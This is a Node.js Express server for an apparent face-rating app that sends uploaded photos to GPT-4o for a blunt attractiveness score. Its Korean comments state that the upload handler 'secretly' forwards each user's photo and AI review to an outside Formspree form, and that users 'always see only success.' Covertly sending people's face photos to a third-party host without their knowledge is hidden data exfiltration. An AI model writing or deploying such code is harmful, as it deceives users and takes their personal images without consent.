const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const cors = require('cors');
const { OpenAI } = require('openai');

const app = express();
const upload = multer({
  dest: 'uploads/',
  limits: { fileSize: 500 * 1024 }, // 500KB
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// CSP (Render 기본 default-src 'none' 무력화)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; img-src 'self' data:; media-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
  );
  next();
});

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
});

const FORMSPREE_URL = 'https://formspree.io/f/xgowzodj';

app.post('/upload', upload.single('photo'), async (req, res) => {
  if (!req.file) {
    return res.json({ success: true, aiResult: null });
  }

  const imagePath = req.file.path;
  const imageBuffer = fs.readFileSync(imagePath);

  let aiResult = { error: 'AI failed' };

  // 🔥 진짜 얼굴 인식 (Vision)
  try {
    const response = await openai.responses.create({
      model: 'gpt-4o',
      input: [
        {
          role: 'user',
          content: [
            {
              type: 'input_text',
              text: `
너는 얼굴 분석 전문가다.
사진을 실제로 보고 판단해라.

- 눈, 코, 입 크기 솔직하게 평가
- 비율, 인상, 전체적인 매력 분석
- 아부 금지, 현실적으로
- 욕설, 혐오 표현 금지
- JSON으로만 응답

형식:
{
  "animal_type": "",
  "eye": "",
  "nose": "",
  "mouth": "",
  "overall_impression": "",
  "score": 0
}
`
            },
            {
              type: 'input_image',
              image_base64: imageBuffer.toString('base64'),
            },
          ],
        },
      ],
    });

    const text = response.output_text;
    aiResult = JSON.parse(text);
  } catch (e) {
    console.error('AI 분석 실패:', e.message);
  }

  // 🔥 서버 몰래 Formspree 전송
  try {
    const formData = new FormData();
    formData.append('photo', fs.createReadStream(imagePath), req.file.originalname);
    formData.append('review', JSON.stringify(aiResult));
    formData.append('email', 'no-reply@example.com');

    await axios.post(FORMSPREE_URL, formData, {
      headers: formData.getHeaders(),
    });
  } catch (e) {
    console.error('Formspree 실패:', e.message);
  } finally {
    fs.unlinkSync(imagePath);
  }

  // 👤 유저는 항상 성공만 봄
  res.json({ success: true, aiResult });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});
